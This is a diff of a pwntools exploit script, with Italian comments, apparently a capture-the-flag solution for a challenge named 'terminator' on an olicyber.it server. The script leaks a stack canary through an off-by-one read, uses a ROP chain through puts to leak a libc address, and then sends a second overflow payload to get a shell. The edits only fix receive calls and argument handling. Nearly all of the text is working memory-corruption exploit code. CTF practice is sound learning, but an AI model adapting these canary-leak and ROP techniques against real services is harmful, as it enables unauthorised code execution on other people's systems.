@@ -1,11 +1,8 @@
 from pwn import *
 from sys import argv
 
-remo = 'remo' in  argv[1]
-if remo:
-    el = ELF('terminator_nopatch')
-else:
-    el = ELF('terminator')
+
+el = ELF('terminator')
 
 context.binary = el
 
@@ -26,7 +23,7 @@ print(f'{offset=}')
 # off by one sulla richiesta del nome
 # smetterebbe di leggere allo 00 del canary ma lo sovrascrive con 10(a capo)
 # così stampo il canary
-if remo:
+if args.REMOTE:
     p = remote('terminator.challs.olicyber.it' ,10307)
 else:
     p = process('./terminator_dbg')
@@ -40,7 +37,7 @@ p.recvuntil(b'> ')
 # no sendline, avrei due a capo
 p.send(b'A' * offset)
 p.recvline()
-canary = p.recv(7)
+canary = p.recvn(7)
 # other memory leak, inutile
 old_bp = p.recvuntil(b'Nice', drop=True).ljust(8, b'\x00')
 
@@ -86,7 +83,7 @@ print(f'{len(rop_str)=}')
 payload = flat({
     8: rop_str,
     offset: canary,
-    offset + 8: overwrite_bp,
+    offset + 8: overwrite_bp
 })
 # dovrei aggiungere un pop rbp ma lo fa lui subito dopo il ret, quando torna in main
 
@@ -95,7 +92,12 @@ p.send(payload)
 p.recvuntil(b'Goodbye!\n', drop=True)
 
 # here return address is overwritten with puts address
-recieved = p.recvline().strip()
+
+
+# che odio
+# tagliavo via un byte da sinistra
+# evidentemente carica in memoria a un offset allineato
+recieved = p.recvline().rstrip()
 leak = u64(recieved.ljust(8, b"\x00"))
 
 libc_func_address = libc.symbols[reference_func]
@@ -115,7 +117,7 @@ shell = p64(shell)
 p.recvuntil(b'> ')
 p.send(b'A' * offset)
 p.recvline()
-p.recv(7)
+p.recvn(7)
 # new base pointer memory leak
 old_bp = p.recvuntil(b'Nice', drop=True).ljust(8, b'\x00')
 old_bp = u64(old_bp)
